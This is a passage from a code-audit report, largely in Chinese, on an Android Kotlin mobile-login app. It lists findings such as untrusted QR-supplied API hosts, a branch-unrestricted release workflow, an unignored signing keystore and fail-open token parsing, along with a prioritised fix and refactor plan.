- 命名大体清晰，Kotlin 包按 `core/auth`、`core/crash`、`ui` 分层。
- 文档描述了移动登录协议和仓库验证策略。

## 11. Design / Principles Concerns

- Coverage: High
- Inspected evidence: trust boundaries, file size, fail-fast/defaults, copy policy, state ownership
- Exclusions / limits: 未做运行时 UX 研究

| Finding | Principle violated | Severity |
|---------|--------------------|----------|
| F1 | Fail-Fast 4.4, Boundary Contract, Least Privilege 4.6 | Critical |
| F2 | Least Privilege 4.6, Release Boundary | High |
| F5 | Fail-Fast 4.4 | Medium |
| F6 | Do Not Swallow Errors 6.1 | Medium |
| F9 | SRP 1.1, File Size Limit 1.2 | Medium |

Verified checklist:

- HTTPS-only network client、加密凭据存储、显式 API client 是正向设计。
- 当前最大问题是外部输入边界没有 fail-closed。

## 12. Release Concerns

- Coverage: High
- Inspected evidence: GitHub Actions, Gradle release build, signing script, artifact manifest
- Exclusions / limits: 未检查远端环境保护规则或历史 release

| Finding | Severity | Release impact |
|---------|----------|----------------|
| F2 | High | 任意分支 push 可能成为 latest release。 |
| F3 | High | 签名材料生命周期有误提交风险。 |
| F7 | Medium | 发布安全配置可 fail-open。 |
| F10 | Low | 缺少 provenance/SBOM/locking。 |

Verified checklist:

- CI 已运行 unit test 和 Android lint。
- Release APK 生成 checksum 与 JSON manifest。
- 签名 secrets 在非 PR push 下被强制检查。

## 13. Documentation Analysis

- Coverage: Medium
- Inspected evidence: `android/README.md`, `docs/android-mobile-login-integration.md`, workflow comments/steps
- Exclusions / limits: 后端真实接口实现不在仓库内，无法校验文档与服务端一致性

| Finding | Subtype | Documentation gap |
|---------|---------|-------------------|
| F3 | OperatorDocs | 脚本提示 keystore 已被 ignore，但 `.gitignore` 实际不匹配。 |
| F4 | ApiDocs/UserDocs | 文档要求不复制 token，UI 实现违反契约。 |
| F8 | DeveloperDocs | 文档说明验证在 GitHub Actions，但缺少测试范围和关键流程覆盖说明。 |

Verified checklist:

- Android README 清楚说明本地不得运行构建/测试。
- 移动登录集成文档详细描述 API 与推荐流程。

## 14. Observability / Operability Analysis

- Coverage: Medium
- Inspected evidence: crash reporter, crash share UI, API error formatter, CI artifact upload
- Exclusions / limits: 未检查远程日志、指标、告警或 runbook

| Finding | Severity | Operability impact |
|---------|----------|--------------------|
| F6 | Medium | 凭据解析失败没有可观测错误状态。 |
| F8 | Medium | CI 没有流程级测试 artifact 可帮助定位 auth 回归。 |

Verified checklist:

- 崩溃报告包含 report ID、系统信息、stack trace 和最近事件。
- CI 上传 unit test/lint reports。
- API 错误消息包含 method、URL、HTTP status 和字段名，不包含请求值。

## 15. Configuration Safety Analysis

- Coverage: High
- Inspected evidence: Gradle BuildConfig fields, workflow env/secrets, manifest/network config
- Exclusions / limits: 未访问实际 repository secrets

| Finding | Subtype | Impact |
|---------|---------|--------|
| F7 | UnsafeDefault / SchemaValidation | pinning 缺失或非法配置会回退 false。 |
| F2 | EnvironmentSeparation | release 行为未按稳定分支/tag 隔离。 |

Verified checklist:

- API base URL 默认是 HTTPS。
- 明文网络被 Android 配置禁用。
- release signing secrets 在 push release 路径中被检查。

## 16. Data Integrity Analysis

- Coverage: Medium
- Inspected evidence: credential persistence, account JSON, active account, token expiry, docs
- Exclusions / limits: 未模拟并发、进程杀死或 MMKV 损坏

| Finding | Severity | Invariant at risk |
|---------|----------|-------------------|
| F5 | Medium | 无法解析有效期的 token 不应被视为有效。 |
| F6 | Medium | 已保存多账号凭据不应因解析错误静默变成空列表。 |

Verified checklist:

- 账号保存会维护 active account 和 legacy active keys。
- expired token 清理路径存在，但对 malformed expiry fail-open。

## 17. Privacy / Data Governance Analysis

- Coverage: Medium
- Inspected evidence: credential store, clipboard, crash report, device ID, docs
- Exclusions / limits: 未检查隐私政策、数据保留政策或 Android backup 实测

| Finding | Severity | Privacy impact |
|---------|----------|----------------|
| F1 | Critical | 长期凭据可能发往不受信 host。 |
| F4 | Medium | 长期 SML token 可进入剪贴板。 |
| F3 | High | 签名材料本地残留可能泄露。 |

Verified checklist:

- JWT/client token 使用 MMKV 加密存储。
- `allowBackup=false` 降低系统备份泄露风险。
- 崩溃报告 sanitizes 用户目录、file/content URI；未发现请求值主动记录。

## 18. Accessibility / UX Correctness Analysis

- Coverage: Medium
- Inspected evidence: Compose labels, buttons, dialogs, scanner permission flow, error text
- Exclusions / limits: 未运行 TalkBack、contrast、small-screen、keyboard-only 实测

| Finding | Severity | UX impact |
|---------|----------|-----------|
| F1 | Critical | UI 展示目标站点但不阻止未知 host，用户确认负担过高。 |
| F4 | Medium | 敏感 token 复制按钮易造成误操作。 |
| F9 | Medium | 大文件 UI 增加状态一致性风险。 |

Verified checklist:

- 主要输入框有 label，按钮文本明确。
- 相机权限拒绝时有可见说明和授权按钮。
- 多账号确认弹窗存在并显示目标站点。

## 19. Supply Chain / Reproducibility Analysis

- Coverage: High
- Inspected evidence: workflow, Gradle repositories/versions, signing script, local sensitive file inventory
- Exclusions / limits: 未运行 CVE/dependency audit 或远端 artifact 验证

| Finding | Severity | Supply-chain impact |
|---------|----------|---------------------|
| F2 | High | 未受保护分支可触发 latest release。 |
| F3 | High | release signing key 文件可能被误提交。 |
| F10 | Low | 缺少 lock/provenance/SBOM/SHA-pinned actions。 |

Verified checklist:

- Gradle 插件版本显式声明。
- dependency repositories 限定为 Google、Maven Central、Gradle Plugin Portal。
- release assets 有 SHA-256 checksum。

## 20. Cost / Resource Economics Analysis

- Coverage: Medium
- Inspected evidence: network calls, scanner analyzer, CI triggers, Gradle dependencies
- Exclusions / limits: 未检查 GitHub Actions 实际耗时、API 计费或移动数据消耗

| Finding | Severity | Cost driver |
|---------|----------|-------------|
| F2 | High | 任意分支 push 构建 release 和上传资产，增加 CI 与发布维护成本。 |
| F10 | Low | 没有 APK size/dependency weight 基线，无法持续控制包体。 |

Verified checklist:

- OkHttp 超时避免无限挂起。
- QR analyzer 保留最新帧，避免帧积压。

## 21. AI / LLM Safety Analysis

- Coverage: Not assessed
- Inspected evidence: `rg` 搜索 model/LLM/tool/RAG surfaces，Android 源码与 Gradle deps
- Exclusions / limits: 项目没有 AI/LLM 运行面，本维度不评分

No AI/LLM runtime findings.

Verified checklist:

- 未发现 prompt、RAG、tool authorization、model fallback、LLM API key 或 eval 代码。

## 22. Fallback / Defensive Code Analysis

- Coverage: High
- Inspected evidence: `runCatching`, `getOrDefault`, Gradle defaults, workflow fallbacks
- Exclusions / limits: 未运行异常路径

| Finding | Subtype | Action |
|---------|---------|--------|
| F5 | SilentFallback | 过期时间解析失败应 fail-closed。 |
| F6 | SilentFallback | 凭据 JSON 解析失败应暴露错误并保留恢复路径。 |
| F7 | DefensiveGuess | release 安全配置非法值不应回退 false。 |

Verified checklist:

- API 请求失败会抛 `SynapseApiException`，不是全部吞掉。
- Turnstile 加载失败会展示错误和重试入口。

## 23. Testing Authenticity Analysis

- Coverage: High
- Inspected evidence: all unit tests, test dependencies, CI steps
- Exclusions / limits: 未运行 tests/coverage/mutation

### Confidence Assessment

| Test Area | Real Confidence | Risk | Action |
|-----------|-----------------|------|--------|
| JSON mappings | Medium | 映射字段变化可被捕获一部分 | Keep |
| Error formatter | Medium | 请求值不回显有回归保护 | Keep |
| QR parser | Low | 只覆盖 scheme/HTTP，不覆盖 trusted host | Extend |
| Repository/ViewModel/UI | None | 认证流程和状态机 bug 会逃逸 | Add |
| Workflow/signing policy | None | 发布事故不会被测试阻止 | Add |

### Valuable Tests

- `SynapseApiErrorFormatterTest.failureMessageDoesNotEchoRequestValues`
- `AuthModelsTest.tokenPreviewHidesMiddleOfLongTokens`
- `CertificatePinPolicyTest.parseKeepsOnlySha256Pins`

### Suspicious Tests

没有明显过度 mock 的测试；问题是覆盖范围太窄。

### Missing Tests

见 F8：恶意 QR host、Repository 网络目标、凭据过期/损坏、多账号确认、clipboard、release workflow policy、signing script ignore contract。

## 24. Type Safety Analysis

- Coverage: Medium
- Inspected evidence: Kotlin models, nullable fields, `JSONObject` mapping, error types
- Exclusions / limits: 未运行 Kotlin compiler；JSON schema 未由后端共享

| Finding | Subtype | Type-safety impact |
|---------|---------|-------------------|
| F5 | StringlyTyped | `clientLoginTokenExpiresAt` 以 String 持久化，解析失败 fail-open。 |
| F6 | ErrorType | `parseAccounts` 丢失异常类型和恢复上下文。 |

Verified checklist:

- Kotlin nullable 类型用于 JWT/token/user 可选字段。
- `SynapseApiException` 至少保留 HTTP status code。

## 25. Frontend State Analysis

- Coverage: High
- Inspected evidence: `SynapseUiState`, `SynapseLoginViewModel`, Compose panels/dialogs
- Exclusions / limits: 未运行 Compose recomposition/UI tests

| Finding | Subtype | Affected components |
|---------|---------|---------------------|
| F4 | RequestState / SensitiveState | `CredentialSummary`, `CopyableLine` |
| F8 | RequestState | ViewModel auth/QR actions |
| F9 | ComponentSize / UIBusinessCoupling | `SynapseMobileApp`, `SynapseLoginViewModel` |

Verified checklist:

- StateFlow + `collectAsStateWithLifecycle` 使用正确。
- 多账号弹窗状态在 `SynapseUiState` 中显式建模。

## 26. Backend API Analysis

- Coverage: Medium
- Inspected evidence: Android API client and mobile-login integration docs
- Exclusions / limits: 仓库未包含 backend routes/controllers/services，无法审计服务端授权实现

| Finding | Subtype | Endpoint impact |
|---------|---------|-----------------|
| F1 | Auth / DataFlow | `/challenge/scan` 和 `/challenge/confirm` host 来自 QR payload。 |
| F8 | Validation | API client contract 没有网络层回归。 |

Verified checklist:

- API client 方法按 endpoints 分离。
- 错误响应统一格式化。
- Bearer token 设置集中在 `post/get` helper。

## 27. Dependency Weight Analysis

- Coverage: Medium
- Inspected evidence: Gradle dependencies, repositories, release shrink settings
- Exclusions / limits: 未生成 dependency tree、transitive count、APK analyzer

### Dependency Scoreboard

| Dependency | Status | Weight | Transitives | Used For | Recommended Action |
|------------|--------|--------|-------------|----------|--------------------|
| `androidx.compose.material:material-icons-extended` | Potentially overweight | Unknown | Unknown | 多个 UI icon | 建立 APK size 基线后决定 keep 或替换 |
| `com.google.mlkit:barcode-scanning` | Healthy but heavy | Unknown | Unknown | QR scanning | Keep, 监控 APK size |
| `com.tencent:mmkv` | Healthy | Unknown | Unknown | encrypted credential store | Keep, 补测试 |
| `androidx.security:security-crypto:1.1.0-alpha06` | Review | Unknown | Unknown | MasterKey/EncryptedSharedPreferences | 确认可接受 alpha 依赖 |

Relevant finding: F10.

## 28. Code Consistency Analysis

- Coverage: Medium
- Inspected evidence: naming, package structure, error patterns, UI helper patterns
- Exclusions / limits: 未运行 ktlint/detekt

| Finding | Severity | Consistency issue |
|---------|----------|-------------------|
| F6 | Medium | 错误处理策略不一致：API fail-fast，凭据解析 fail-silent。 |
| F9 | Medium | UI helper 和业务 panel 聚合在同一大文件。 |

Verified checklist:

- 文件命名与 Kotlin/Android 约定一致。
- API method 命名清楚，基本按后端 endpoint 表达行为。

## 29. Comment Coverage Analysis

- Coverage: Medium
- Inspected evidence: README, integration doc, inline comments
- Exclusions / limits: 未逐行验证所有文档与后端运行行为

| Finding | Severity | Comment/doc issue |
|---------|----------|-------------------|
| F3 | High | 脚本输出说明与 `.gitignore` 实际状态不一致。 |
| F4 | Medium | 文档安全约束与 UI clipboard 实现不一致。 |

Verified checklist:

- 文档比代码注释更完整，适合继续作为契约来源。
- 源码中少量注释不足不是主要风险，主要风险是契约未被测试强制。

---

## 30. Principles Compliance

整体原则遵循度中等。代码在 HTTPS、加密存储、集中 API client、清晰命名方面较好；主要原则风险集中在 fail-fast、最小权限、SRP、错误不吞没和发布边界。

### Principles Violated

| Principle | Violations | Severity | Affected Areas |
|-----------|------------|----------|----------------|
| Fail-Fast (4.4) | 3 | Critical/Medium | QR host validation, expiry parsing, pinning config |
| Principle of Least Privilege (4.6) | 2 | High/Critical | QR credential forwarding, workflow permissions |
| Do Not Swallow Errors (6.1) | 1 | Medium | credential JSON parsing |
| Single Responsibility (1.1) | 2 | Medium | `SynapseMobileApp.kt`, `SynapseLoginViewModel.kt` |
| File Size Limit (1.2) | 3 | Medium | `SynapseMobileApp.kt`, `CrashReportScreen.kt`, `SynapseLoginViewModel.kt` |
| Configuration Over Hardcoding / Safe Defaults (9.1/9.2) | 1 | Medium | certificate pinning config |

### Principles Respected

- 网络层集中到 `SynapseMobileLoginApi` 与 `SynapseSecureOkHttpFactory`。
- Manifest 禁用 backup 与 cleartext，减少平台级泄露面。
- 错误格式化避免回显请求值，符合敏感数据最小暴露原则。
- 文档明确移动登录流程和二次验证/token 语义，可作为后续测试契约。

---

## 31. Architecture Analysis

### Architecture Summary

| Subtype | Count | Affected Areas | Recommended Action |
|---------|-------|----------------|--------------------|
| ModuleBoundary | 1 | Compose UI monolith | Split panels/components by workflow |
| DependencyDirection | 0 | None confirmed | Keep current core/ui direction |
| StateOwnership | 1 | QR confirm + active account | Extract testable coordinator |
| BoundaryContract | 1 | QR `apiBaseUrl` | Bind to configured trusted origin |
| EvolutionRisk | 2 | ViewModel, tests | Add state-machine tests before feature growth |

F1 and F9 are the actionable architecture findings.

## 32. Documentation Analysis

### Documentation Summary

| Subtype | Count | Affected Docs | Recommended Action |
|---------|-------|---------------|--------------------|
| UserDocs | 1 | `docs/android-mobile-login-integration.md` | Align UI copy behavior with token copy prohibition |
| OperatorDocs | 1 | `setup-android-signing.ps1` output | Fix keystore ignore statement |
| DeveloperDocs | 1 | `android/README.md` | Add verification scope and required GitHub workflow checks |
| ApiDocs | 0 | None confirmed | Keep docs synced with backend |
| DecisionRecord | 1 | release process | Add release governance decision |
| StaleDocs | 1 | signing script notice | Correct after `.gitignore` fix |

## 33. Privacy / Data Governance Analysis

### Privacy Summary

| Subtype | Count | Affected Data | Recommended Action |
|---------|-------|---------------|--------------------|
| DataInventory | 1 | JWT, SML token, device ID | Document storage/copy/retention |
| Minimization | 1 | clipboard token | Do not copy full token |
| AccessBoundary | 1 | QR host | Restrict credential destination |
| Retention | 1 | local keystore/base64 artifact | Delete temporary sensitive files by default |
| Deletion | 0 | local account clear exists | Add tests |
| Export | 0 | no data export feature | Not assessed |
| TelemetryPrivacy | 0 | crash report | Continue redaction review |

## 34. Accessibility / UX Correctness Analysis

### Accessibility Summary

| Subtype | Count | Affected Workflows | Recommended Action |
|---------|-------|--------------------|--------------------|
| SemanticStructure | 0 | Main forms | Keep labels/text |
| KeyboardFocus | 0 | Not confirmed | Add UI tests |
| ResponsiveVisual | 0 | Not confirmed | Test small screens |
| ErrorState | 1 | QR unknown host | Convert warning text to blocking validation |
| LoadingState | 0 | ViewModel loading | Add tests |
| UXStateCorrectness | 1 | token clipboard | Remove dangerous copy affordance |

## 35. Supply Chain / Reproducibility Analysis

### Supply Chain Summary

| Subtype | Count | Affected Surface | Recommended Action |
|---------|-------|------------------|--------------------|
| DependencyProvenance | 1 | Gradle deps/actions | Add verification/lock/SHA pin |
| Reproducibility | 1 | Gradle wrapper/lock absence | Define reproducible build strategy |
| CIIntegrity | 1 | workflow permissions/release branches | Split verify/release and scope permissions |
| ArtifactProvenance | 1 | release assets | Add signing verification/SBOM/provenance |
| RegistryHygiene | 0 | Android app only | Not assessed |

## 36. Cost / Resource Economics Analysis

### Cost Summary

| Subtype | Count | Cost Driver | Recommended Action |
|---------|-------|-------------|--------------------|
| UnboundedWork | 0 | Not confirmed | Keep scanner backpressure |
| ExternalApiCost | 0 | Auth API calls | Existing timeouts help |
| LLMCost | 0 | None | Not applicable |
| InfrastructureSizing | 0 | Android client | Not applicable |
| ObservabilityCost | 0 | Crash reports local only | Not material |
| CostVisibility | 1 | CI release on every branch | Restrict release workflow |

## 37. AI / LLM Safety Analysis

### AI Safety Summary

| Subtype | Count | Boundary Crossed | Recommended Action |
|---------|-------|------------------|--------------------|
| PromptInjection | 0 | None | Not assessed |
| ToolAuthorization | 0 | None | Not assessed |
| RAGLeakage | 0 | None | Not assessed |
| ModelFallback | 0 | None | Not assessed |
| OutputValidation | 0 | None | Not assessed |
| EvalGap | 0 | None | Not assessed |
| AbuseCost | 0 | None | Not assessed |

No AI/LLM surface found.

## 38. Observability / Operability Analysis

### Signal Summary

| Subtype | Count | Critical Signals Missing | Recommended Action |
|---------|-------|--------------------------|--------------------|
| Logging | 1 | credential parse failures | Expose safe local diagnostic |
| Metrics | 0 | Mobile app only | Not required now |
| Tracing | 0 | Mobile app only | Not required now |
| HealthCheck | 0 | Mobile app only | Not required now |
| Alerting | 0 | Mobile app only | Not required now |
| Runbook | 1 | release/signing incident | Add operator docs |
| Debuggability | 1 | auth state machine | Add tests and safe debug state |

## 39. Configuration Safety Analysis

### Configuration Summary

| Subtype | Count | Affected Keys / Files | Recommended Action |
|---------|-------|-----------------------|--------------------|
| SchemaValidation | 1 | `SYNAPSE_REQUIRE_CERTIFICATE_PINS` | Reject invalid release value |
| UnsafeDefault | 1 | certificate pins | Require pins for release if policy demands it |
| EnvironmentSeparation | 1 | release workflow | Separate verify and release triggers |
| SecretConfig | 1 | signing files | Fix ignore/default cleanup |
| FeatureFlag | 0 | None confirmed | Not assessed |
| ConfigDocs | 1 | signing script notice | Correct stale statement |

## 40. Data Integrity Analysis

### Integrity Summary

| Subtype | Count | Invariants at Risk | Recommended Action |
|---------|-------|--------------------|--------------------|
| TransactionBoundary | 1 | account list + active account | Consider atomic account state blob |
| Idempotency | 0 | API client | Not confirmed |
| ConcurrencyConsistency | 0 | single-process MMKV | Not confirmed |
| MigrationSafety | 1 | `accounts_json` parsing | Add schema version/recovery |
| InvariantValidation | 1 | token expiry parse | Fail closed |
| BackupRestore | 0 | backup disabled | Not assessed |
| Reconciliation | 0 | no remote reconciliation | Not assessed |

## 41. Fallback / Defensive Code Analysis

### Fallback Summary

| Subtype | Count | KeepWithAlert | FailFast | Remove |
|---------|-------|---------------|----------|--------|
| SilentFallback | 3 | 1 | 2 | 0 |
| EmptyCatch | 0 | 0 | 0 | 0 |
| CompatibilityBranch | 0 | 0 | 0 | 0 |
| SilentCorrection | 0 | 0 | 0 | 0 |
| DefensiveGuess | 1 | 0 | 1 | 0 |

Main fallback findings: F5, F6, F7.

## 42. Testing Authenticity Analysis

### Confidence Assessment

| Test Area | Real Confidence | Risk | Action |
|-----------|-----------------|------|--------|
| Parser/mapping unit tests | Medium | low-level changes caught | Keep |
| Auth Repository | None | token leak/state bugs escape | Add |
| Compose QR/account UI | None | unsafe UX regressions escape | Add |
| CI release policy | None | release accidents escape | Add |

### Valuable Tests

见第 23 节。

### Suspicious Tests

无明显过度 mock；主要问题是缺少测试。

### Missing Tests

见 F8。

---

## 43. Type Safety Analysis

### Summary

| Subtype | Count | Critical | High | Medium | Low |
|---------|-------|----------|------|--------|-----|
| UnsafeBlock | 0 | 0 | 0 | 0 | 0 |
| TypeAssertion | 0 | 0 | 0 | 0 | 0 |
| InputBoundary | 1 | 1 | 0 | 0 | 0 |
| OutputLeak | 1 | 0 | 0 | 1 | 0 |
| BooleanTrap | 0 | 0 | 0 | 0 | 0 |
| StringlyTyped | 1 | 0 | 0 | 1 | 0 |
| ErrorType | 1 | 0 | 0 | 1 | 0 |

InputBoundary maps to F1; StringlyTyped/ErrorType maps to F5/F6.

## 44. Frontend State Analysis

### Summary

| Subtype | Count | Affected Components |
|---------|-------|---------------------|
| ComponentSize | 2 | `SynapseMobileApp`, `CrashReportScreen` |
| StateDuplication | 0 | Not confirmed |
| PropDrilling | 0 | Not material |
| EffectChain | 0 | Not confirmed |
| UIBusinessCoupling | 1 | `SynapseLoginViewModel` |
| DOMasState | 0 | Not applicable |
| RequestState | 2 | login/QR actions |
| RenderPerf | 0 | Not confirmed |

Relevant findings: F4, F8, F9.

## 45. Backend API Analysis

### Summary

| Subtype | Count | Affected Endpoints |
|---------|-------|--------------------|
| ApiConsistency | 0 | Not confirmed |
| Validation | 1 | QR payload `apiBaseUrl` client validation |
| Auth | 1 | `/challenge/confirm` credential forwarding |
| NplusOne | 0 | Not applicable |
| Caching | 0 | Not applicable |
| ErrorResponse | 0 | Formatter covered |
| BusinessLogic | 0 | Backend absent |
| DataFlow | 1 | QR payload -> API client host |

## 46. Dependency Weight Analysis

### Dependency Scoreboard

| Dependency | Status | Weight | Transitives | Used For | Recommended Action |
|------------|--------|--------|-------------|----------|--------------------|
| Compose BOM + Material3 | Healthy | Unknown | Unknown | UI | Keep |
| Material icons extended | Review | Unknown | Unknown | Icons | Measure APK size |
| ML Kit barcode scanning | Healthy | Unknown | Unknown | QR scanner | Keep with size baseline |
| MMKV | Healthy | Unknown | Unknown | credential store | Keep with corruption tests |
| security-crypto alpha | Review | Unknown | Unknown | encrypted metadata | Confirm alpha risk |

## 47. Recommended Fix Order

### Fix Immediately

| Finding | Action |
|---------|--------|
| F1 | Reject QR payloads whose `apiBaseUrl` is not the configured/trusted Synapse origin before any network call. |
| F2 | Restrict release workflow to protected branch/tag/manual release; scope `contents: write` to release only. |
| F3 | Add `synapse-release.jks` and backup to `.gitignore`; remove local temporary signing artifacts and rotate if exposure is plausible. |

### Fix Before Stable Release

| Finding | Action |
|---------|--------|
| F4 | Disable full token copying from UI. |
| F5 | Treat malformed expiry as expired and clear local credentials. |
| F6 | Replace silent credential parse fallback with recoverable error handling. |
| F7 | Fail release build when required pin config is absent or invalid. |
| F8 | Add Repository/network/UI/workflow regression tests for auth and release boundaries. |

### Schedule Later

| Finding | Action |
|---------|--------|
| F9 | Split UI/ViewModel by workflow after tests exist. |
| F10 | Add dependency locking/provenance/SBOM/SHA-pinned actions and APK size baseline. |

### Ignore for Now

没有建议忽略的已确认风险；低优先级 F10 可以排在安全和发布修复之后。

## 48. Quick Wins

| Quick win | Value | Effort |
|-----------|-------|--------|
| Add trusted-origin check before `apiFor(payload.apiBaseUrl)` | Removes highest credential exfiltration path | 1-2 hours |
| Add `.gitignore` entries for `synapse-release.jks` and `.bak` | Prevents accidental keystore commit | 10 minutes |
| Remove `copyValue = active.clientLoginToken.orEmpty()` | Stops clipboard token exposure | 15-30 minutes |
| Change expiry parse fallback to expired | Makes token validation fail-closed | 30 minutes |
| Add workflow branch guard to release step | Prevents accidental latest release | 30-60 minutes |
| Add one QR malicious-host test | Locks F1 regression | 1 hour |

## 49. Long-term Refactor Plan

1. Authentication boundary hardening  
   Motivation: QR and token flows are the critical security surface.  
   Approach: Introduce `TrustedSynapseOrigin` value object and only construct API clients from configured origins; QR payload no longer supplies arbitrary host.  
   Risk: Existing custom deployment workflows may break if they relied on arbitrary QR origins.  
   Testing strategy: Parser, Repository and ViewModel tests for default origin, alternate allowlisted origin, rejected origin and expired payload.

2. Testable auth state machine  
   Motivation: ViewModel currently owns many workflows with no state-machine tests.  
   Approach: Extract login, QR confirm and credential management coordinators with fake API/store interfaces.  
   Risk: Refactor can change UI state names; keep Compose surface stable until tests pass.  
   Testing strategy: Unit tests for each transition plus one Compose smoke test per tab.

3. Release pipeline split  
   Motivation: Verification and publishing have different permissions and trust boundaries.  
   Approach: `verify-android.yml` for all branches/PRs with read permission; `release-android.yml` for protected tags/manual dispatch with write permission and environment approval.  
   Risk: Initial release process friction.  
   Testing strategy: YAML policy checks and dry-run workflow dispatch in GitHub Actions, not local machine.
